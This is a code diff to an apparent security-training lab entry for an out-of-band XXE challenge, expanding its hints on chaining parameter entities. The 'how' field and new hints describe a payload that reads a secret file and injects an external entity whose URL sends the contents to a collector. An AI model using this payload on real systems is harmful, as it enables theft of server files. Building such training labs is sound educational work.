@@ -15,7 +15,7 @@ const vuln = {
   name: 'Parameter-Entity OOB Exfiltration',
   difficulty: 'Hard',
   hint: 'Chain parameter entities entirely inline: %file; reads the secret, %oob; declares a new entity whose URL carries %file; to the in-lab collector. Mind the quoting.',
-  hints: ["Parameter entities (%) work in the DTD. Can they exfiltrate data out-of-band?", "Chain: %file reads the secret, %oob builds a URL with it, and the parser fetches that URL. Check the collector.", "Submit the parameter-entity OOB payload and watch the collector log for the secret."],
+  hints: ["Parameter entities (%) work in the DTD. Can they exfiltrate data out-of-band?", "Do it all inline: one parameter entity reads the secret file, another builds a callback URL containing that content, and referencing it makes the parser fire the request. Mind the quoting: parameter entity values and URL attributes nest at different levels.", "Declare the file-reading parameter entity, then a second parameter entity that injects a general entity whose SYSTEM identifier is the collector URL carrying the file content, and reference that general entity in your document body to fire the pingback. Key insight: the parser, not your browser, performs the callback fetch, so the secret leaves server-side and lands in the collector log."],
   tools: "C",
   how: 'Submit a DOCTYPE where %oob; injects <!ENTITY exfil SYSTEM \'http://.../xxe/collector/log?d=%file;\'> (single quotes!), then reference &exfil; to fire the pingback.',
   link: '/xxe#xxe-param-oob',
